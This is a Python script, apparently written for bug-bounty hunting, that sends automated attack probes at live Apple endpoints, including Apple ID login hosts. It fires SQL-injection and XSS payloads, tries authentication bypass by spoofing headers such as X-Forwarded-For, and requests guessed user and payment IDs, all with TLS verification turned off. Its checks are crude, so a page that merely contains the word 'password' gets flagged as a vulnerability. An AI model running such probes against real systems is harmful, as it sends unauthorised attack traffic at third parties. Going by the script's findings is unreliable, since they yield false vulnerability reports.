#!/usr/bin/env python3
#!/usr/bin/env python3
"""
Copyright © 2025 DoctorMen. All Rights Reserved.
"""
"""
Improved Apple Endpoint Testing - Actually Find Vulnerabilities
Fix mistakes and test for real security issues
"""

import requests
import json
import urllib3
from pathlib import Path
from datetime import datetime
from urllib.parse import urlparse, parse_qs

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

REPO_ROOT = Path(__file__).parent.parent
ROI_OUTPUT_DIR = REPO_ROOT / "output" / "immediate_roi"
RESULTS_DIR = REPO_ROOT / "output" / "apple_testing"

def test_single_endpoint(url: str, findings: list):
    """Test a single endpoint for vulnerabilities"""
    
    print(f"  Testing: {url}")
    
    # Test 1: Follow redirects and test final endpoint
    print("    [TEST 1] Follow redirects")
    try:
        response = requests.get(url, timeout=10, allow_redirects=True, verify=False)
        
        final_url = response.url
        print(f"      Final URL: {final_url}")
        print(f"      Status: {response.status_code}")
        
        if response.status_code == 200:
            print("      ⚠️  Got 200 - endpoint is accessible!")
            
            # Test for common vulnerabilities
            vulnerability_tests = test_common_vulnerabilities(final_url, response)
            findings.extend(vulnerability_tests)
        
    except Exception as e:
        print(f"      Error: {e}")
    
    # Test 2: Authentication bypass
    print("    [TEST 2] Authentication bypass")
    auth_tests = test_authentication_bypass(url)
    findings.extend(auth_tests)
    
    # Test 3: IDOR
    print("    [TEST 3] IDOR")
    idor_tests = test_idor(url)
    findings.extend(idor_tests)
    
    # Test 4: SQL Injection
    print("    [TEST 4] SQL Injection")
    sql_tests = test_sql_injection(url)
    findings.extend(sql_tests)
    
    # Test 5: XSS
    print("    [TEST 5] XSS")
    xss_tests = test_xss(url)
    findings.extend(xss_tests)

def test_vulnerabilities():
    """Test for actual vulnerabilities"""
    
    print("=" * 60)
    print("IMPROVED APPLE ENDPOINT TESTING")
    print("=" * 60)
    print()
    print("Fixing mistakes:")
    print("   ❌ Old: Only tested redirects")
    print("   ✅ New: Testing actual vulnerabilities")
    print("   ❌ Old: Focused on CDN endpoints")
    print("   ✅ New: Focus on real Apple endpoints")
    print()
    
    RESULTS_DIR.mkdir(parents=True, exist_ok=True)
    findings = []
    
    # Get REAL Apple endpoints
    real_endpoints = [
        "https://api.apple.com",
        "https://developer.apple.com",
        "https://developer.apple.com/api",
        "https://idmsa.apple.com",
        "https://appleid.apple.com",
    ]
    
    print("Testing REAL Apple endpoints:")
    for ep in real_endpoints:
        print(f"   - {ep}")
    print()
    
    # Test real Apple endpoints
    for url in real_endpoints:
        print(f"Testing: {url}")
        test_single_endpoint(url, findings)
        print()
    
    # Load discovered endpoints
    apple_endpoints = []
    priority_file = ROI_OUTPUT_DIR / "priority_endpoints_by_program.json"
    
    if priority_file.exists():
        with open(priority_file, 'r') as f:
            data = json.load(f)
            apple_endpoints = data.get("apple", [])
    
    # Test discovered endpoints (skip CDN)
    if apple_endpoints:
        print("Testing discovered endpoints (non-CDN only):")
        for endpoint in apple_endpoints[:5]:
            url = endpoint.get("url", "")
            domain = endpoint.get("domain", "")
            
            # Skip CDN endpoints (hash prefix)
            if domain and any(char.isdigit() and len(domain.split('.')[0]) > 15 for char in domain):
                print(f"⚠️  Skipping CDN endpoint: {url}")
                continue
            
            print(f"Testing discovered endpoint: {url}")
            test_single_endpoint(url, findings)
            print()
    
    # Save findings
    findings_file = RESULTS_DIR / "vulnerability_findings.json"
    with open(findings_file, 'w') as f:
        json.dump(findings, f, indent=2)
    
    print("=" * 60)
    print("RESULTS SUMMARY")
    print("=" * 60)
    print()
    
    vulnerable = [f for f in findings if f.get("vulnerable", False)]
    potential = [f for f in findings if f.get("potential", False)]
    
    print(f"Total tests: {len(findings)}")
    print(f"Vulnerable findings: {len(vulnerable)}")
    print(f"Potential findings: {len(potential)}")
    print()
    
    if vulnerable:
        print("⚠️  VULNERABILITIES FOUND!")
        for v in vulnerable:
            print(f"   - {v['test_type']}: {v['url']}")
            print(f"     Finding: {v.get('finding', 'N/A')}")
        print()
    
    if potential:
        print("⚠️  POTENTIAL ISSUES:")
        for p in potential:
            print(f"   - {p['test_type']}: {p['url']}")
        print()
    
    print(f"✅ Results saved to: {findings_file}")
    print()
    
    print("=" * 60)
    print("NEXT STEPS")
    print("=" * 60)
    print()
    
    if vulnerable:
        print("✅ You found vulnerabilities!")
        print("   - Review findings")
        print("   - Verify manually")
        print("   - Submit to Apple")
    else:
        print("⚠️  No vulnerabilities found yet")
        print("   - Test more endpoints")
        print("   - Try different attack vectors")
        print("   - Focus on authentication endpoints")
        print("   - Consider focusing on Rapyd (higher success rate)")
    
    print()

def test_common_vulnerabilities(url: str, response: requests.Response) -> list:
    """Test for common vulnerabilities"""
    findings = []
    
    # Check response headers for security issues
    headers = response.headers
    
    # Missing security headers
    security_headers = ['X-Frame-Options', 'X-Content-Type-Options', 'Strict-Transport-Security']
    missing_headers = []
    
    for header in security_headers:
        if header not in headers:
            missing_headers.append(header)
    
    if missing_headers:
        findings.append({
            "test_type": "Missing Security Headers",
            "url": url,
            "vulnerable": True,
            "finding": f"Missing headers: {', '.join(missing_headers)}",
            "severity": "Low"
        })
    
    # Check for sensitive data in response
    sensitive_keywords = ['password', 'token', 'api_key', 'secret', 'private']
    response_text = response.text.lower()
    
    for keyword in sensitive_keywords:
        if keyword in response_text:
            findings.append({
                "test_type": "Information Disclosure",
                "url": url,
                "vulnerable": True,
                "finding": f"Potential sensitive data exposure: {keyword}",
                "severity": "Medium"
            })
    
    return findings

def test_authentication_bypass(url: str) -> list:
    """Test for authentication bypass"""
    findings = []
    
    # Skip public websites (false positives)
    public_keywords = ['/account', '/login', '/signup', '/', '']
    parsed = urlparse(url)
    path = parsed.path
    
    # If it's just the root path, it's probably a public website
    if path in ['/', ''] or path in public_keywords:
        # Check if it's a login page or public page
        try:
            response = requests.get(url, timeout=10, verify=False)
            if response.status_code == 200:
                # Check if it's a public page (login, homepage, etc.)
                content_lower = response.text.lower()
                if any(keyword in content_lower for keyword in ['login', 'sign in', 'welcome', 'home', 'developer portal']):
                    # This is a public page, not a vulnerability
                    return findings
        except:
            pass
    
    # Test without authentication
    try:
        response = requests.get(url, timeout=10, verify=False)
        
        # Only flag if it's a PROTECTED endpoint that should require auth
        if response.status_code == 200:
            # Check if it's actually protected content (not public page)
            content_lower = response.text.lower()
            
            # If it contains protected keywords, might be vulnerable
            protected_keywords = ['api', 'admin', 'dashboard', 'private', 'user data', 'payment']
            if any(keyword in url.lower() for keyword in protected_keywords):
                # Check if response contains sensitive data
                sensitive_keywords = ['api_key', 'token', 'password', 'email', 'account_id']
                if any(keyword in content_lower for keyword in sensitive_keywords):
                    findings.append({
                        "test_type": "Authentication Bypass",
                        "url": url,
                        "vulnerable": True,
                        "finding": "Protected endpoint accessible without authentication - contains sensitive data",
                        "severity": "High"
                    })
                else:
                    # Might be vulnerable but needs manual verification
                    findings.append({
                        "test_type": "Potential Authentication Bypass",
                        "url": url,
                        "vulnerable": False,
                        "finding": "Protected endpoint accessible - needs manual verification",
                        "severity": "Unknown",
                        "needs_verification": True
                    })
        elif response.status_code == 401:
            # Try common bypass techniques
            bypass_headers = [
                {"X-Forwarded-For": "127.0.0.1"},
                {"X-Real-IP": "127.0.0.1"},
                {"X-Originating-IP": "127.0.0.1"},
                {"X-Remote-IP": "127.0.0.1"},
            ]
            
            for header in bypass_headers:
                bypass_response = requests.get(url, headers=header, timeout=10, verify=False)
                if bypass_response.status_code == 200:
                    findings.append({
                        "test_type": "Authentication Bypass",
                        "url": url,
                        "vulnerable": True,
                        "finding": f"Bypass via header: {header}",
                        "severity": "High"
                    })
                    break
    
    except Exception:
        pass
    
    return findings

def test_idor(url: str) -> list:
    """Test for IDOR vulnerabilities"""
    findings = []
    
    # Try common IDOR patterns
    idor_patterns = [
        "/api/users/1",
        "/api/users/123",
        "/api/users/999999",
        "/api/payments/1",
        "/api/orders/1",
    ]
    
    parsed = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"
    
    for pattern in idor_patterns:
        test_url = base_url + pattern
        try:
            response = requests.get(test_url, timeout=10, verify=False)
            
            if response.status_code == 200:
                # Check if response contains user data
                if any(keyword in response.text.lower() for keyword in ['email', 'user', 'account', 'payment']):
                    findings.append({
                        "test_type": "IDOR",
                        "url": test_url,
                        "vulnerable": True,
                        "finding": "Possible IDOR - endpoint accessible with different ID",
                        "severity": "High"
                    })
        
        except Exception:
            pass
    
    return findings

def test_sql_injection(url: str) -> list:
    """Test for SQL injection"""
    findings = []
    
    sql_payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "1' UNION SELECT NULL--",
        "admin'--",
    ]
    
    parsed = urlparse(url)
    
    # Test in query parameters
    if parsed.query:
        for payload in sql_payloads:
            test_url = f"{url}&test={payload}"
            try:
                response = requests.get(test_url, timeout=10, verify=False)
                
                # Check for SQL error messages
                sql_errors = ['sql syntax', 'mysql', 'ora-', 'sqlite', 'postgresql']
                if any(error in response.text.lower() for error in sql_errors):
                    findings.append({
                        "test_type": "SQL Injection",
                        "url": test_url,
                        "vulnerable": True,
                        "finding": "Possible SQL injection - error message detected",
                        "severity": "Critical"
                    })
            
            except Exception:
                pass
    
    return findings

def test_xss(url: str) -> list:
    """Test for XSS vulnerabilities"""
    findings = []
    
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "'><script>alert('XSS')</script>",
    ]
    
    parsed = urlparse(url)
    
    # Test in query parameters
    if parsed.query:
        for payload in xss_payloads:
            test_url = f"{url}&test={payload}"
            try:
                response = requests.get(test_url, timeout=10, verify=False)
                
                # Check if payload is reflected
                if payload in response.text:
                    findings.append({
                        "test_type": "XSS",
                        "url": test_url,
                        "vulnerable": True,
                        "finding": "Possible XSS - payload reflected in response",
                        "severity": "Medium"
                    })
            
            except Exception:
                pass
    
    return findings

if __name__ == "__main__":
    test_vulnerabilities()
